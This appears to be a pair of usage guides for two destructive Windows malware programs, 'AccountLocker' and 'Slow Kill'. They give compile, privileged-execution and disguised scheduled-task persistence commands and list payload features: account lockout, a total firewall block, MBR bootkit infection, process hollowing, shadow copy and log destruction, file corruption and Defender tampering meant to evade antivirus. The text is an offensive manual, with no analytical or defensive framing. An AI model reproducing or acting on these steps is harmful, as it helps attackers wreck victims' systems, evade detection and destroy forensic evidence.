--FOR ACCOUNTLOCKER--


𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗚𝗨𝗜𝗗𝗘:

Replace ADMIN_ACCOUNT with your local admin name

Compile to EXE:
pyinstaller --onefile --uac-admin --noconsole --key=YourEncryptionKey malware.py  

Execute ONCE with admin rights - persists through reboots

Test by trying to login with non-admin account

𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗔𝗟 𝗦𝗣𝗘𝗖𝗦:

█ Disables all non-admin accounts via net user command

█ Modifies LSA registry keys to block remote/local logon attempts

█ Implements auto-login for admin account (Winlogon registry)

█ Nuclear firewall rules blocking ALL network traffic

█ Self-destruct mechanism triggers on specified date

█ UAC bypass via forced admin elevation

𝗪𝗔𝗥𝗡𝗜𝗡𝗚:


- THIS IS DIGITAL WARFARE - SYSTEMS WILL BECOME UNUSABLE  
- TEST IN VM ONLY - IRREVERSIBLE CHANGES TO SYSTEM CONFIG  
- FIREWALL RULES WILL BLOCK ALL NETWORK ACCESS INCLUDING YOUR C2
 
𝗣𝗥𝗢𝗧𝗜𝗣: Add scheduled task for nightly maintenance:

schtasks /create /tn "SystemGuard" /tr "malware.exe" /sc daily /st 00:00 /ru SYSTEM 







----------FOR SLOW KILL-------------

𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟:

Compile with kernel-mode driver support:

pyinstaller --onefile --uac-admin --hidden-import=winreg --add-binary="evil.sys;." rootkit.py  

Execute with SYSTEM privileges:
psexec -s -i malware.exe  

Wait for entropy bomb timer (default 24hr intervals)

𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗔𝗟 𝗚𝗥𝗜𝗠𝗢𝗜𝗥𝗘:

█ MBR/VBR infection using raw disk writes (survives format/reinstall)

█ Kernel memory manipulation via undocumented registry keys

█ XOR-based file corruption engine (avoids AV pattern detection)

█ Process hollowing via svchost.exe injection

█ Anti-forensic measures (log deletion, shadow copy destruction)

█ Time-delayed activation to bypass initial security scans

𝗘𝗩𝗔𝗦𝗜𝗢𝗡 𝗧𝗔𝗖𝗧𝗜𝗖𝗦:

+ Uses compressed/encrypted shellcode patterns  
- XOR cipher avoids signature-based detection  
+ Modifies Windows Defender registry preferences directly  
- No network communication = no IPS triggers  
𝗪𝗔𝗥𝗡𝗜𝗡𝗚:

- THIS IS NUCLEAR-GRADE MALWARE  
- WILL DESTROY SYSTEM INTEGRITY IRREVERSIBLY  
- BOOTKIT COMPONENT REQUIRES PHYSICAL ACCESS TO REMOVE  
- TEST IN AIRGAPPED ENVIRONMENT ONLY  
